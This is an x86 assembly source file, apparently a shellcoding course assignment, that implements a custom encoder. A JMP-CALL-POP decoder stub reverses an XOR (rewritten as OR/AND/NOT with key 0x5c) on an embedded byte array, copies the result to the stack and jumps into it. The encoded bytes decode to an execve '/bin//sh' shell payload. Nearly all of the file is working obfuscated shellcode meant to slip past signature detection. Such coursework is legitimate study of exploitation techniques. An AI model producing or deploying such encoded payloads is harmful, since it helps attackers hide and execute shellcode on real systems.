; SLAE-XXX
; assignemnt 4.2: create custom encoder
; originality: decomposed XOR in OR AND and NOT 

; this is the key we use for encoding / decoding  
%define key 0x5c 


global _start			

section .text
_start:
	; we jump to symbol call_decoder to get its address onto the stack  
	jmp short call_decoder

decoder:
	; we pop the address of the shellcode into esi (the return address is located on the stack) 
	pop esi
	; we clean ecx 
	xor ecx, ecx
	; put size of the shellcode into ecx 
	mov cl,25
	; we prepare a place to store the decoded shell, here the stack, pointed by edx  
	; nasm compiler makes the stack executable and writable, convenient for us here :] 
	mov edx,esp 

decode:
	; xor decomposed 
        ; a xor b  = (a or b) and (not(a and b))
        ; al is one byte / 8 bits
        ; ( a or b )
        xor eax,eax
        mov byte al,byte[esi]
        or al,key
        ; store the result in bl
        mov bl,al
        ; (a and b) stored in al
        xor eax,eax
        mov byte al,byte[esi]
        and al,key
        ; not (a and b)
        not al
        and bl,al
	; we copy to stack since the code section is non writable 
        mov byte[edx],bl
	; we go to next byte and continue 
	inc esi
	inc edx 
	; loop decreases ecx :] 
	loop decode
	; jmp to the decrypted shellcode copied on the stack and execute it, it should be execve-stack decrypted  
	jmp esp 

call_decoder:
	call decoder
	Shellcode: db 0x6d,0x9c,0x0c,0x34,0x73,0x73,0x2f,0x34,0x34,0x73,0x3e,0x35,0x32,0xd5,0xbf,0x0c,0xd5,0xbe,0x0f,0xd5,0xbd,0xec,0x57,0x91,0xdc
	; the encoded shellcode is  6d9c0c3473732f3434733e3532d5bf0cd5be0fd5bdec5791dc
